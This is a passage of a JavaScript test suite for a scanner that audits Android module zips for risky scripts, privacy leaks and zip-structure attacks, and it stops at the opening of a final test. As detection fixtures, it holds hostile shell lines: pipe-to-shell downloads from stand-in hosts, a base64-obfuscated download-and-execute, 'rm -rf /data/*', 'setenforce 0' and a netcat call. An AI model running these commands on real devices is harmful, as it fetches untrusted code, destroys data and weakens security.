// 模块审核规则单测（node:test，无外部依赖）
// 覆盖：rm -rf / curl|sh / base64 执行 / 写 /system / setenforce 0 / hosts / 硬编码 IP /
//       可疑域名 / 隐私用户名 / 邮箱 / 密钥 / 元数据一致性 —— 命中与不命中。
// 运行：node --test scan.test.mjs

import test from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdtempSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { deflateRawSync, crc32 } from 'node:zlib';
import { createHash } from 'node:crypto';

import {
  RULES_BY_ID, CONTENT_RULES, scanContent, checkMetadata, parseModuleProp,
  scoreRisk, decide, countsTowardRisk, SEVERITY_ORDER, CATEGORY_LABEL,
  inspectStructure, unsafePathReason, detectBinary, checkCoverage, checkUnread, checkBinaries,
  MAX_TEXT, MAX_ENTRIES, MAX_RATIO,
  EXEC_BUNDLED_FILE, EXEC_INDIRECT, PROP_BOOT_SPOOF, buildLineContexts,
} from './risk-rules.mjs';
import { scanZip, classify, renderMarkdown, renderJSON, redactText, mask, resolveChangeType, hasShebang, CANONICAL_SCRIPTS, FLASH_ENTRY_POINTS, readZip, resolveBundledTargets, resolveBundledRefs, normalizeRefPath, EXEC_UNRESOLVED_ADVICE, EXEC_UNPINNED_ADVICE, SCAN_TARGET_BUCKETS } from './scan.mjs';
import { makeModuleZip, moduleProp, scanToReport } from './fixtures.mjs';

// ---------------------------------------------------------------------------
// 辅助：命中判定
// ---------------------------------------------------------------------------

function hits(ruleId, text, file = 'customize.sh') {
  const rule = RULES_BY_ID[ruleId];
  assert.ok(rule, `规则 ${ruleId} 不存在`);
  return rule.scan(file, text).filter((f) => f.severity != null);
}

function assertHit(ruleId, text, msg) {
  const h = hits(ruleId, text);
  assert.ok(h.length > 0, `${ruleId} 应当命中：${msg || text}`);
  return h;
}

function assertNoHit(ruleId, text, msg) {
  const h = hits(ruleId, text);
  assert.equal(h.length, 0, `${ruleId} 不应命中：${msg || text} —— 实际命中 ${JSON.stringify(h)}`);
}

// ---------------------------------------------------------------------------
// ① 元信息：规则表完整性
// ---------------------------------------------------------------------------

test('规则表结构完整，每条规则都有 id/category/severity/advice', () => {
  // 18 这个下限是钉住 T2 的扩容（15 -> 20）；fix2 又加了两条执行链规则（EXEC_INDIRECT、
  // MODDIR_RUNTIME_WRITE，20 -> 22），下限随之抬到 20：留着旧数字，规则被悄悄删掉没人被提醒。
  assert.ok(CONTENT_RULES.length >= 20, `内容规则只剩 ${CONTENT_RULES.length} 条`);
  for (const r of CONTENT_RULES) {
    assert.ok(r.id, '缺少 id');
    assert.ok(r.category, `${r.id} 缺少 category`);
    assert.ok(r.advice, `${r.id} 缺少 advice`);
    assert.equal(typeof r.scan, 'function', `${r.id}.scan 不是函数`);
    // scan 必须是纯函数：同一输入两次结果一致
    const a = JSON.stringify(r.scan('x.sh', 'echo hi\nrm -rf /data'));
    const b = JSON.stringify(r.scan('x.sh', 'echo hi\nrm -rf /data'));
    assert.equal(a, b, `${r.id} 不是确定性纯函数`);
  }
});

// ---------------------------------------------------------------------------
// ② 危险模式
// ---------------------------------------------------------------------------

test('RM_RF_MUTABLE：rm -rf 作用于 /data 命中且按作用域分档', () => {
  // 宽泛作用域 -> high
  const h = assertHit('RM_RF_MUTABLE', 'rm -rf /data/*');
  assert.equal(h[0].severity, 'high');
  assert.equal(h[0].line, 1);
  assert.equal(h[0].file, 'customize.sh');
  assert.match(h[0].snippet, /rm -rf/);

  // 分区下的具体子目录 -> medium
  const m = assertHit('RM_RF_MUTABLE', 'rm -rf /data/local/tmp/leftover');
  assert.equal(m[0].severity, 'medium');

  // 分区根 -> high
  assert.equal(hits('RM_RF_MUTABLE', 'rm -rf /system')[0].severity, 'high');
});

test('RM_RF_MUTABLE：删除模块自有目录不命中', () => {
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $MODPATH');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $MODDIR/system/app/Foo');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf /data/adb/modules/old_mod');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $TMPDIR/stage');
});

test('PIPE_TO_SHELL：curl|sh 与 wget -O-|sh 命中 high', () => {
  const a = assertHit('PIPE_TO_SHELL', 'curl -sL https://example.com/i.sh | sh');
  assert.equal(a[0].severity, 'high');
  const b = assertHit('PIPE_TO_SHELL', 'wget -O- http://1.2.3.4/x | bash');
  assert.equal(b[0].severity, 'high');
  assertHit('PIPE_TO_SHELL', 'curl http://a.b | busybox sh');
});

test('PIPE_TO_SHELL：落盘再执行不命中', () => {
  assertNoHit('PIPE_TO_SHELL', 'curl -sL https://example.com/m.zip -o /sdcard/m.zip');
  assertNoHit('PIPE_TO_SHELL', 'wget -O /tmp/m.zip https://example.com/m.zip');
  assertNoHit('PIPE_TO_SHELL', 'sh $MODPATH/install.sh');
});

test('DOWNLOAD_TO_STDOUT：wget -O- 命中 low', () => {
  const h = assertHit('DOWNLOAD_TO_STDOUT', 'wget -O- https://example.com/a.txt > /sdcard/a.txt');
  assert.equal(h[0].severity, 'low');
});

test('OBFUSCATED_DECODE_EXEC：base64 解码后管道执行命中 high，且不与 DECODE_ONLY 重复报', () => {
  const text = 'echo aGVsbG8gd29ybGQK | base64 -d | sh';
  const h = assertHit('OBFUSCATED_DECODE_EXEC', text);
  assert.equal(h[0].severity, 'high');
  assertNoHit('OBFUSCATED_DECODE_ONLY', text, '已由 EXEC 规则报 high，不应重复');
});

test('OBFUSCATED_DECODE_ONLY：仅解码未执行命中 medium', () => {
  const h = assertHit('OBFUSCATED_DECODE_ONLY', 'base64 -d payload.b64 > /data/local/tmp/p.bin');
  assert.equal(h[0].severity, 'medium');
  assertNoHit('OBFUSCATED_DECODE_ONLY', 'base64 image.png > out.txt'); // 无 -d，纯编码
});

test('WRITE_SYSTEM_VENDOR：直接写 /system 命中 high；$MODPATH 覆盖层不命中', () => {
  assert.equal(assertHit('WRITE_SYSTEM_VENDOR', 'cp busybox /system/xbin/bb')[0].severity, 'high');
  assertHit('WRITE_SYSTEM_VENDOR', 'mount -o rw,remount /system');
  assertHit('WRITE_SYSTEM_VENDOR', 'echo "ro.foo=1" >> /system/build.prop');
  // 标准覆盖层写法
  assertNoHit('WRITE_SYSTEM_VENDOR', 'cp -f busybox $MODPATH/system/xbin/bb');
  assertNoHit('WRITE_SYSTEM_VENDOR', 'mkdir -p $MODPATH/system/app/Foo');
});

test('SELINUX_DISABLE：setenforce 0 命中 high，setenforce 1 不命中', () => {
  assert.equal(assertHit('SELINUX_DISABLE', 'setenforce 0')[0].severity, 'high');
  assertHit('SELINUX_DISABLE', 'echo 0 > /sys/fs/selinux/enforce');
  assertNoHit('SELINUX_DISABLE', 'setenforce 1');
});

test('HOSTS_MODIFY：写 hosts 命中 medium；无关心文件不命中', () => {
  const h = assertHit('HOSTS_MODIFY', 'cp $MODPATH/hosts /system/etc/hosts');
  assert.equal(h[0].severity, 'medium');
  assertHit('HOSTS_MODIFY', 'echo "127.0.0.1 ads.example" >> /system/etc/hosts');
  assertNoHit('HOSTS_MODIFY', 'echo "hello" > /data/local/tmp/notes.txt');
});

// ---------------------------------------------------------------------------
// ③ 外联
// ---------------------------------------------------------------------------

test('HARDCODED_IP：公网 IP medium，内网/回环 low，版本号样式的数字串不命中', () => {
  assert.equal(assertHit('HARDCODED_IP', 'curl http://45.77.12.9/payload')[0].severity, 'medium');
  assert.equal(assertHit('HARDCODED_IP', 'nc 192.168.1.10 4444')[0].severity, 'low');
  assert.equal(assertHit('HARDCODED_IP', 'ping 127.0.0.1')[0].severity, 'low');
  assertNoHit('HARDCODED_IP', 'versionCode=1024');
  assertNoHit('HARDCODED_IP', '# 1.2.3.4 已废弃');
});

test('SUSPICIOUS_DOMAIN：遥测/广告域名与匿名 TLD 命中；正常域名不命中', () => {
  assertHit('SUSPICIOUS_DOMAIN', 'curl https://sdk.umeng.com/collect');
  assertHit('SUSPICIOUS_DOMAIN', 'POST https://www.googletagmanager.com/gtm.js');
  assertHit('SUSPICIOUS_DOMAIN', 'https://payload.xyz/drop');
  assertNoHit('SUSPICIOUS_DOMAIN', 'https://github.com/foo/bar');
  assertNoHit('SUSPICIOUS_DOMAIN', 'https://raw.githubusercontent.com/a/b/main/modules.json');
  assertNoHit('SUSPICIOUS_DOMAIN', '# see magisk docs');
});

test('NETWORK_FETCH：任意 http(s) 地址命中 low（供人工核对）', () => {
  assert.equal(assertHit('NETWORK_FETCH', 'https://example.com/x.zip')[0].severity, 'low');
  assertNoHit('NETWORK_FETCH', 'cp /sdcard/a /sdcard/b');
});

// ---------------------------------------------------------------------------
// ④ 投稿者隐私（info，不计入风险）
// ---------------------------------------------------------------------------

test('PRIVACY_HOME_USER：绝对路径用户名命中 info；root 等通用账号名不命中', () => {
  const h = assertHit('PRIVACY_HOME_USER', 'built at /home/johndoe/modules');
  assert.equal(h[0].severity, 'info');
  assert.equal(countsTowardRisk(h[0]), false, 'info 级不应计入风险等级');
  assertHit('PRIVACY_HOME_USER', 'C:\\Users\\Alice\\workspace\\mod');
  assertHit('PRIVACY_HOME_USER', '/Users/bob/code/mod');
  assertNoHit('PRIVACY_HOME_USER', '/home/root/mod');
  assertNoHit('PRIVACY_HOME_USER', 'MODDIR=/data/adb/modules/x');
});

test('PRIVACY_EMAIL：邮箱命中 info；noreply 地址不命中', () => {
  assert.equal(assertHit('PRIVACY_EMAIL', 'maintainer: zhangsan@example.com')[0].severity, 'info');
  assertNoHit('PRIVACY_EMAIL', 'author: foo@users.noreply.github.com');
});

test('PRIVACY_SECRET：AKIA / sk- / token= / 私钥头命中 info；纯变量引用不命中', () => {
  assertHit('PRIVACY_SECRET', 'AKIAIOSFODNN7EXAMPLE');
  assertHit('PRIVACY_SECRET', 'sk-abcdefghijklmnopqrstuvwx123456');
  assertHit('PRIVACY_SECRET', 'token=abcd1234efgh5678');
  assertHit('PRIVACY_SECRET', '-----BEGIN PRIVATE KEY-----');
  assertHit('PRIVACY_SECRET', 'password: hunter2hunter2');
  assertNoHit('PRIVACY_SECRET', 'token=$API_TOKEN');
  assertNoHit('PRIVACY_SECRET', '# password: 填你自己的');
});

// ---------------------------------------------------------------------------
// ⑤ 元数据一致性
// ---------------------------------------------------------------------------

test('parseModuleProp 正确解析键值与行号', () => {
  const { fields } = parseModuleProp('id=cool_mod\nversion=v1.2\nname=Cool\n# comment\nversionCode=3\n');
  assert.equal(fields.id.value, 'cool_mod');
  assert.equal(fields.id.line, 1);
  assert.equal(fields.version.value, 'v1.2');
  assert.equal(fields.version.line, 2);
  assert.equal(fields.versionCode.value, '3');
  assert.equal(fields['# comment'], undefined);
});

test('checkMetadata：一致则不报，id/version 不一致分别报 medium', () => {
  const prop = { present: true, path: 'module.prop', fields: parseModuleProp('id=a\nversion=v1\n').fields };
  const ok = checkMetadata(prop, { id: 'a', version: 'v1' });
  assert.equal(ok.filter((f) => f.ruleId.startsWith('META_') && f.severity !== 'low').length, 0, JSON.stringify(ok));

  const bad = checkMetadata(prop, { id: 'b', version: 'v2' });
  const ids = bad.map((f) => f.ruleId);
  assert.ok(ids.includes('META_ID_MISMATCH'), JSON.stringify(ids));
  assert.ok(ids.includes('META_VERSION_MISMATCH'), JSON.stringify(ids));
  assert.equal(bad.find((f) => f.ruleId === 'META_ID_MISMATCH').severity, 'medium');
});

test('checkMetadata：module.prop 缺失或字段缺失也报 medium', () => {
  const none = checkMetadata({ present: false, path: 'module.prop', fields: {} }, {});
  assert.ok(none.some((f) => f.ruleId === 'META_PROP_MISSING' && f.severity === 'medium'));

  const partial = checkMetadata({ present: true, path: 'module.prop', fields: parseModuleProp('id=a\n').fields }, { id: 'a' });
  assert.ok(partial.some((f) => f.ruleId === 'META_FIELD_MISSING_VERSION'));
});

// ---------------------------------------------------------------------------
// 定级与决策
// ---------------------------------------------------------------------------

test('scoreRisk：有 high 即 high，无 high 有 medium 即 medium，其余 low；info 不参与', () => {
  assert.equal(scoreRisk([{ severity: 'info' }]).level, 'low');
  assert.equal(scoreRisk([{ severity: 'low' }]).level, 'low');
  assert.equal(scoreRisk([{ severity: 'medium' }, { severity: 'info' }]).level, 'medium');
  assert.equal(scoreRisk([{ severity: 'high' }, { severity: 'low' }]).level, 'high');
  assert.equal(scoreRisk([]).level, 'low');
});

test('decide：低风险+首次收录才自动放行；版本更新即便低风险也人工审；中高风险一律人工', () => {
  const a = decide('low', 'first');
  assert.equal(a.action, 'auto-approve');
  assert.equal(a.label, 'auto-approved');
  assert.equal(a.needsHumanReview, false);

  const b = decide('low', 'update');
  assert.equal(b.action, 'request-review');
  assert.equal(b.label, 'needs-human-review');
  assert.equal(b.needsHumanReview, true);

  for (const lv of ['medium', 'high']) {
    for (const ct of ['first', 'update']) {
      const d = decide(lv, ct);
      assert.equal(d.needsHumanReview, true, `${lv}/${ct} 必须人工审`);
      assert.equal(d.label, 'needs-human-review');
    }
  }
  // 变更类型未知 -> 保守转人工
  assert.equal(decide('low', 'unknown').needsHumanReview, true);
});

test('resolveChangeType：依据索引判断首次收录 / 版本更新', () => {
  const prop = { fields: { id: { value: 'mod_x', line: 1 } } };
  assert.equal(resolveChangeType({ index: [{ id: 'mod_x' }] }, prop), 'update');
  assert.equal(resolveChangeType({ index: { modules: [{ moduleId: 'other' }] } }, prop), 'first');
  assert.equal(resolveChangeType({ index: ['mod_x'] }, prop), 'update');
  assert.equal(resolveChangeType({}, prop), 'unknown');
  assert.equal(resolveChangeType({ changeType: 'update' }, prop), 'update', '显式指定优先');
});

// ---------------------------------------------------------------------------
// 端到端：造 zip 跑 scanZip
// ---------------------------------------------------------------------------

function crc32buf(buf) {
  // node:zlib 的 crc32 在较新版本提供，这里保留 0 值兜底（zip 读取器不校验 CRC）
  try { return crc32(buf); } catch { return 0; }
}

function buildZip(entries) {
  // entries: [{ name, content(string|Buffer), method = 8, extAttr = 0,
  //             declaredOrig, declaredComp }] -> Buffer
  // declaredOrig/declaredComp 允许只改中心目录的声明值：测 zip bomb 与伪装条目时，
  // 需要的正是「声明与真实不一致」这种输入。
  const locals = [];
  const central = [];
  let offset = 0;
  for (const e of entries) {
    const nameBuf = Buffer.from(e.name, 'utf8');
    const dataBuf = Buffer.isBuffer(e.content) ? e.content : Buffer.from(String(e.content == null ? '' : e.content), 'utf8');
    const method = e.method == null ? 8 : e.method;
    const comp = method === 8 ? deflateRawSync(dataBuf) : dataBuf;
    const crc = crc32buf(dataBuf);
    const origDecl = e.declaredOrig == null ? dataBuf.length : e.declaredOrig;
    const compDecl = e.declaredComp == null ? comp.length : e.declaredComp;

    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);
    lh.writeUInt16LE(0, 6);
    lh.writeUInt16LE(method, 8);
    lh.writeUInt32LE(crc, 14);
    lh.writeUInt32LE(compDecl, 18);
    lh.writeUInt32LE(origDecl, 22);
    lh.writeUInt16LE(nameBuf.length, 26);
    lh.writeUInt16LE(0, 28);
    locals.push(lh, nameBuf, comp);

    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0);
    ch.writeUInt16LE(20, 4);
    ch.writeUInt16LE(20, 6);
    ch.writeUInt16LE(0, 8);
    ch.writeUInt16LE(method, 10);
    ch.writeUInt32LE(crc, 16);
    ch.writeUInt32LE(compDecl, 20);
    ch.writeUInt32LE(origDecl, 24);
    ch.writeUInt16LE(nameBuf.length, 28);
    ch.writeUInt32LE(e.extAttr || 0, 38);
    ch.writeUInt32LE(offset, 42);
    central.push(ch, nameBuf);

    offset += 30 + nameBuf.length + comp.length;
  }
  const cdBuf = Buffer.concat(central);
  const body = Buffer.concat(locals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(body.length, 16);
  return Buffer.concat([body, cdBuf, eocd]);
}

function writeZip(name, entries) {
  const dir = mkdtempSync(join(tmpdir(), 'modaudit-'));
  const p = join(dir, name);
  writeFileSync(p, buildZip(entries));
  return p;
}

const CLEAN_PROP = 'id=cool_mod\nname=Cool Mod\nversion=v1.0\nversionCode=1\nauthor=anon\ndescription=demo\n';
const CLEAN_SH = '#!/system/bin/sh\necho "installing"\ncp -f busybox $MODPATH/system/xbin/bb\n';

test('端到端：干净模块（首次收录）判 low 且自动放行', () => {
  const p = writeZip('clean.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.reader, 'builtin', '应走内置解析器');
  assert.equal(r.riskLevel, 'low', JSON.stringify(r.findings));
  assert.equal(r.decision.action, 'auto-approve');
  assert.equal(r.decision.label, 'auto-approved');
  assert.equal(r.meta.id, 'cool_mod');
  assert.equal(r.inventory.canonicalScripts.length, 2, '应识别两个规范脚本');
  // ① 逐行扫过的文件全文必须纳入报告
  //（Task 2.7 改了这一节的标题：`cls.others` 里的数据文件也在这节里，叫「脚本全文」就是说假话。）
  assert.match(renderMarkdown(r), /## 逐行扫过的文件全文/);
  assert.match(renderMarkdown(r), /busybox \$MODPATH/);
});

test('端到端：恶意模块判 high，脚本全文与行号证据都在报告里', () => {
  const bad = [
    '#!/system/bin/sh',
    'setenforce 0',
    'curl -sL https://payload.xyz/i.sh | sh',
    'echo Y3VybCBodHRwOi8vNDUuNzcuMTIuOS94IHwgYmFzaAo= | base64 -d | sh',
    'rm -rf /data/*',
    'cp x /system/bin/x',
    'echo "0.0.0.0 a.umeng.com" >> /system/etc/hosts',
    '# built on /home/johndoe',
    'contact: me@example.com',
    'token=abcd1234efgh5678',
  ].join('\n');
  const p = writeZip('bad.zip', [
    { name: 'module.prop', content: 'id=evil_mod\nversion=v9\n' },
    { name: 'customize.sh', content: bad },
    { name: 'service.sh', content: bad },
    { name: 'uninstall.sh', content: bad },
    { name: 'action.sh', content: 'nc 192.168.1.10 4444\n' },
  ]);
  const r = scanZip(p, { declaredId: 'evil_mod', declaredVersion: 'v1', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  const ids = new Set(r.findings.map((f) => f.ruleId));
  for (const need of ['SELINUX_DISABLE', 'PIPE_TO_SHELL', 'OBFUSCATED_DECODE_EXEC',
    'RM_RF_MUTABLE', 'WRITE_SYSTEM_VENDOR', 'HOSTS_MODIFY', 'SUSPICIOUS_DOMAIN',
    'PRIVACY_HOME_USER', 'PRIVACY_EMAIL', 'PRIVACY_SECRET', 'META_VERSION_MISMATCH']) {
    assert.ok(ids.has(need), `应命中 ${need}；实际 ${[...ids].join(',')}`);
  }
  // 证据含文件名+行号+原文片段
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.equal(sel.file, 'customize.sh');
  assert.equal(sel.line, 2);
  assert.match(sel.snippet, /setenforce/);
  assert.ok(r.scripts.every((s) => typeof s.content === 'string' && s.content.length > 0));
  // 全文内嵌的是「会被执行或会被读的文本」：四个 .sh 入口 + module.prop
  // （.prop 属属性文件，installer/resetprop 会读，同样纳入行级规则）
  assert.equal(r.scripts.length, 5, 'customize/service/uninstall/action 四个 .sh 与 module.prop 全部纳入');
  assert.ok(r.scripts.some((s) => s.name === 'module.prop'));
});

test('端到端：低风险但为版本更新 -> 打 needs-human-review 不自动合入', () => {
  const p = writeZip('update.zip', [
    { name: 'module.prop', content: 'id=cool_mod\nversion=v1.1\n' },
    { name: 'customize.sh', content: CLEAN_SH },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.1', changeType: 'update' });
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'request-review');
  assert.equal(r.decision.label, 'needs-human-review');
  assert.equal(r.decision.needsHumanReview, true);
});

test('端到端：报告渲染 —— Markdown 含结论/表格/隐私脱敏，JSON 可解析', () => {
  const p = writeZip('privacy.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: '# built at /home/johndoe\n# contact me@example.com\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const md = renderMarkdown(r);
  assert.match(md, /风险等级：LOW/);
  assert.match(md, /auto-approved/);
  assert.match(md, /投稿者隐私提示/);
  assert.ok(!md.includes('johndoe'), 'Markdown 中隐私原文应脱敏');
  assert.ok(!md.includes('me@example.com'));

  const j = JSON.parse(renderJSON(r));
  assert.equal(j.riskLevel, 'low');
  assert.equal(j.schema, 'module-audit-report/v1');
  const priv = j.findings.filter((f) => f.category === 'privacy');
  assert.ok(priv.length >= 2);
  assert.ok(priv.every((f) => !f.snippet.includes('johndoe')), 'JSON 隐私片段应脱敏');
});

test('mask 对短串原样返回，对长串打码', () => {
  assert.equal(mask('abcd'), 'abcd');
  const m = mask('johndoe_secret_value');
  assert.ok(m.includes('*'));
  assert.ok(!m.includes('secret_value'));
});

test('classify 按规范顺序排列五个脚本，其余归入 otherScripts/others', () => {
  const p = writeZip('cls.zip', [
    { name: 'action.sh', content: 'x' },
    { name: 'uninstall.sh', content: 'x' },
    { name: 'customize.sh', content: 'x' },
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'extra/helper.sh', content: 'x' },
    { name: 'README.md', content: 'x' },
  ]);
  const r = scanZip(p, {});
  assert.deepEqual(r.inventory.canonicalScripts.map((s) => s.name.split('/').pop()),
    ['customize.sh', 'uninstall.sh', 'action.sh']);
  assert.ok(r.inventory.otherScripts.some((s) => s.name === 'extra/helper.sh'));
  // Task 2.7（fix10-P11）：README.md 是「前 512 字节没有 NUL、又没被前面任何一个桶接住」的可读文本，
  // 扩面之后它落在 feed 上、被逐行扫过 —— 于是它不再是「未纳入行级扫描的数据文件」。
  // 断言跟着搬到它真正在的地方。这条用例的原意始终是「每个条目都得在某个清单里有个说法」，
  // 不是「README.md 必须没被读过」；所以下面既有「它在被扫的那份里」，也有「账要平」。
  assert.ok(r.scripts.some((s) => s.name === 'README.md'),
    'README.md 必须在「被逐行扫过的文件」里：' + JSON.stringify(r.scripts.map((s) => s.name)));
  assert.ok(!r.inventory.otherFiles.includes('README.md'),
    '已经被内容扫描的条目不许再算进「未纳入行级扫描的数据文件」：' + JSON.stringify(r.inventory.otherFiles));
  const accounted = new Set([
    ...r.scripts.map((s) => s.name),
    ...r.binaries.map((b) => b.name),
    ...r.inventory.otherFiles,
  ]);
  assert.equal(accounted.size, r.inventory.totalEntries,
    `账要平：${r.inventory.totalEntries} 个条目只对得上 ${accounted.size} 个说法（被逐行扫过 / 登记为二进制 / `
    + `写进「没读过」清单），剩下的条目报告既没读也没说：`
    + JSON.stringify({
      scripts: r.scripts.map((s) => s.name),
      binaries: r.binaries.map((b) => b.name),
      otherFiles: r.inventory.otherFiles,
    }));
});

test('缺少 module.prop 的 zip 报 META_PROP_MISSING 且不低于 medium', () => {
  const p = writeZip('noprop.zip', [{ name: 'customize.sh', content: CLEAN_SH }]);
  const r = scanZip(p, { changeType: 'first' });
  assert.ok(r.findings.some((f) => f.ruleId === 'META_PROP_MISSING'));
  assert.notEqual(r.riskLevel, 'low', '缺少 module.prop 不应判 low');
  assert.equal(r.decision.needsHumanReview, true);
});

// ---------------------------------------------------------------------------
// ⑥ 包结构与审核覆盖度
// ---------------------------------------------------------------------------

test('unsafePathReason：绝对路径 / 上跳 / 盘符 / 反斜杠里的 .. 都能认出', () => {
  assert.equal(unsafePathReason('system/etc/hosts'), null);
  assert.equal(unsafePathReason('../escape.sh'), '含 .. 的上跳路径');
  assert.equal(unsafePathReason('a/../../escape.sh'), '含 .. 的上跳路径');
  assert.equal(unsafePathReason('a\\..\\escape.sh'), '含 .. 的上跳路径', '反斜杠必须先归一化，否则 split("/") 看不见上跳');
  assert.equal(unsafePathReason('/system/etc/hosts'), '绝对路径');
  assert.equal(unsafePathReason('C:/Windows/x'), 'Windows 盘符绝对路径');
  assert.equal(unsafePathReason(''), '空条目名');
  assert.equal(unsafePathReason('a..b/config'), null, '文件名里含 .. 但不是路径段，不算上跳');
});

test('detectBinary：ELF/PE/Mach-O/DEX/class 与「开头含 NUL」命中，纯文本不命中', () => {
  assert.equal(detectBinary(Buffer.from('\x7fELF\x02\x01\x01', 'latin1')).id, 'ELF');
  assert.equal(detectBinary(Buffer.from('MZ\x90\x00', 'latin1')).id, 'PE');
  assert.equal(detectBinary(Buffer.from([0xfe, 0xed, 0xfa, 0xce, 0])).id, 'MACHO');
  assert.equal(detectBinary(Buffer.from([0xca, 0xfe, 0xba, 0xbe])).id, 'MACHO');
  assert.equal(detectBinary(Buffer.from([0xca, 0xfe, 0xba, 0xbe])).id, 'MACHO', 'fat 头，同时也是 Java class 的头四字节');
  assert.equal(detectBinary(Buffer.from([0xbf, 0xba, 0xfe, 0xca])).id, 'MACHO', 'fat 64 的小端');
  assert.equal(detectBinary(Buffer.from([0x7f, 0x45, 0x4c, 0x21])), null, 'ELF 头不完整不能误判；无 NUL 也不该算二进制');
  assert.equal(detectBinary(Buffer.from('dex\n035\0', 'latin1')).id, 'DEX');
  assert.equal(detectBinary(Buffer.from('name=foo\x00bar', 'utf8')).id, 'NUL', '改名成 .txt 的伪装');
  assert.equal(detectBinary(Buffer.from(CLEAN_SH, 'utf8')), null);
  assert.equal(detectBinary(Buffer.from('id=cool_mod', 'utf8')), null);
  assert.equal(detectBinary(null), null);
});

test('inspectStructure：重名/符号链接/越界/条目数/压缩比/超大各有对应级别，且都参与定级', () => {
  const { findings, stats } = inspectStructure([
    { name: 'module.prop', method: 8, compSize: 10, origSize: 40 },
    { name: '../escape.sh', method: 8, compSize: 10, origSize: 20 },
    { name: '/system/xbin/bb', method: 8, compSize: 10, origSize: 20 },
    { name: 'service.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'service.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'w.conf', method: 8, compSize: 10, origSize: 20, isSymlink: true },
    { name: 'secret.bin', method: 8, compSize: 10, origSize: 20, encrypted: true },
    { name: 'packed.bz2', method: 12, compSize: 10, origSize: 20 },
    { name: 'winpath\\a.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'bomb', method: 8, compSize: 1, origSize: 40000 },
  ]);
  const ids = new Set(findings.map((f) => f.ruleId));
  for (const need of ['STRUCT_UNSAFE_PATH', 'STRUCT_DUPLICATE_NAME', 'STRUCT_SYMLINK',
    'STRUCT_ENCRYPTED', 'STRUCT_UNSUPPORTED_METHOD', 'STRUCT_BACKSLASH_PATH', 'STRUCT_RATIO']) {
    assert.ok(ids.has(need), `应命中 ${need}；实际 ${[...ids].join(',')}`);
  }
  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_UNSAFE_PATH').severity, 'high');
  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_DUPLICATE_NAME').severity, 'high');
  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_SYMLINK').severity, 'high');
  assert.ok(findings.every((f) => f.category === 'structure'));
  assert.ok(findings.every((f) => countsTowardRisk(f)), '结构发现必须参与定级，不能只是提示');
  assert.deepEqual(stats.duplicateNames, ['service.sh']);
  assert.equal(stats.symlinks.length, 1);
  assert.equal(stats.entries, 10);
  assert.equal(stats.fileEntries, 10);
});

test('inspectStructure：条目数与解压总量超阈值才报，正常包一条都不报', () => {
  const many = Array.from({ length: MAX_ENTRIES + 5 }, (_, i) => ({ name: `f/${i}.sh`, method: 8, compSize: 100, origSize: 120 }));
  const ids = inspectStructure(many).findings.map((f) => f.ruleId);
  assert.ok(ids.includes('STRUCT_ENTRY_COUNT'), JSON.stringify(ids));

  const bomb = [{ name: 'z', method: 8, compSize: 1000, origSize: 600 * 1024 * 1024 }];
  const b = inspectStructure(bomb).findings.map((f) => f.ruleId);
  assert.ok(b.includes('STRUCT_ZIP_BOMB'), JSON.stringify(b));

  const normal = inspectStructure([
    { name: 'module.prop', method: 8, compSize: 90, origSize: 180 },
    { name: 'customize.sh', method: 8, compSize: 60, origSize: 240 },
    { name: 'system/', method: 0, compSize: 0, origSize: 0, isDir: true },
  ]);
  assert.equal(normal.findings.length, 0, JSON.stringify(normal.findings));
  assert.equal(normal.stats.dirEntries, 1, '目录条目不参与重名/越界判断');
});

test('checkCoverage / checkUnread / checkBinaries 的发现一律不低于 medium，以挡住自动放行', () => {
  const cov = checkCoverage([{ name: 'big.sh', size: MAX_TEXT + 10, truncated: true }, { name: 'ok.sh', size: 10, truncated: false }]);
  assert.equal(cov.length, 1);
  assert.equal(cov[0].ruleId, 'AUDIT_COVERAGE_TRUNCATED');
  assert.ok(SEVERITY_ORDER[cov[0].severity] >= SEVERITY_ORDER.medium);

  const un = checkUnread([{ name: 'a', reason: 'x', overLimit: true }, { name: 'b', reason: 'y', overLimit: false }]);
  assert.equal(un.length, 2);
  assert.ok(un.every((f) => f.ruleId === 'STRUCT_UNREADABLE' && SEVERITY_ORDER[f.severity] >= SEVERITY_ORDER.medium));
  assert.match(un[0].advice, /zip bomb/);

  const bin = checkBinaries([{ name: 'update-binary', id: 'ELF', why: 'ELF 可执行文件/共享库', bytes: 4096 }]);
  assert.equal(bin[0].ruleId, 'STRUCT_BINARY');
  assert.ok(SEVERITY_ORDER[bin[0].severity] >= SEVERITY_ORDER.medium);
  assert.deepEqual(checkUnread([]), []);
});

// ---------------------------------------------------------------------------
// 端到端：结构类攻击必须拦得住
// ---------------------------------------------------------------------------

test('端到端：越界路径条目判 high 且绝不自动放行', () => {
